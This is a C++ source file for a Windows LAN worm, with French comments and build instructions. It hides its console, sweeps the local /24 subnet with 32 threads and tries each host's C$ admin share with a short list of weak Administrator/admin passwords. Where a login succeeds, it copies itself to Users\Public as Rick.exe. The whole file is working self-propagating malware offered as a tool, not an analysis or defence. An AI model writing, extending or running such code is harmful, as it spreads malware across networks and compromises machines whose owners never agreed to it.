// language: C++17, file: src/tools/06_lan_worm.cpp, target: Windows 10/11, MSVC/MinGW
// LAN worm - sweep /24 en threads, WNetAddConnection2 sur C$, creds faibles
// Usage: lan_worm.exe [mot_de_passe_optionnel]
// MinGW: g++ -O2 -std=c++17 06_lan_worm.cpp -o lan.exe -lws2_32 -lmpr
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")

static std::atomic<int> g_next{1};
static std::atomic<int> g_hits{0};

static std::string SelfPath() {
    char p[MAX_PATH]; GetModuleFileNameA(NULL, p, MAX_PATH);
    return p;
}

// prefixe reseau derive de l'IP locale, ex: "192.168.1."
static std::string LocalPrefix() {
    char host[256] = {0};
    if (gethostname(host, sizeof(host)) != 0) return "192.168.1.";
    addrinfo hints{}; hints.ai_family = AF_INET;
    addrinfo* res = nullptr;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return "192.168.1.";
    char ip[64] = {0};
    inet_ntop(AF_INET, &((sockaddr_in*)res->ai_addr)->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    // garde "a.b.c."
    int dots = 0; std::string out;
    for (const char* p = ip; *p; p++) {
        out += *p;
        if (*p == '.' && ++dots == 3) break;
    }
    return out;
}

static bool TryHost(const std::string& ip, const char* user, const char* pass) {
    NETRESOURCEA nr{};
    nr.dwType = RESOURCETYPE_DISK;
    char remote[64]; snprintf(remote, sizeof(remote), "\\\\%s\\C$", ip.c_str());
    nr.lpRemoteName = remote;
    // user/pass passent en argument 2/3 de WNetAddConnection2A, pas dans NETRESOURCE
    DWORD r = WNetAddConnection2A(&nr, pass, user, 0);
    if (r != NO_ERROR) return false;

    // drop dans C$\Users\Public (executable a l'ecriture pour "Users")
    char self[MAX_PATH]; GetModuleFileNameA(NULL, self, MAX_PATH);
    char dst[128]; snprintf(dst, sizeof(dst), "\\\\%s\\C$\\Users\\Public\\Rick.exe", ip.c_str());
    bool ok = CopyFileA(self, dst, FALSE) != 0;
    WNetCancelConnection2A(remote, 0, TRUE);
    return ok;
}

static void Worker(const char* passArg) {
    std::string prefix = LocalPrefix();
    const char* users[]   = { "Administrator", "admin", NULL };
    const char* passes[]  = { "", "admin", "password", "1234", "Administrator", passArg, NULL };
    for (;;) {
        int i = g_next.fetch_add(1);
        if (i > 254) return;
        std::string ip = prefix + std::to_string(i);
        for (int u = 0; users[u]; u++) {
            for (int p = 0; passes[p]; p++) {
                if (TryHost(ip, users[u], passes[p])) {
                    g_hits++;
                    return;
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    FreeConsole();
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    const char* passArg = argc > 1 ? argv[1] : NULL;

    // pool de 32 threads: sweep /24 en quelques secondes
    std::vector<std::thread> pool;
    for (int i = 0; i < 32; i++) pool.emplace_back(Worker, passArg);
    for (auto& t : pool) t.join();

    WSACleanup();
    return g_hits.load();
}
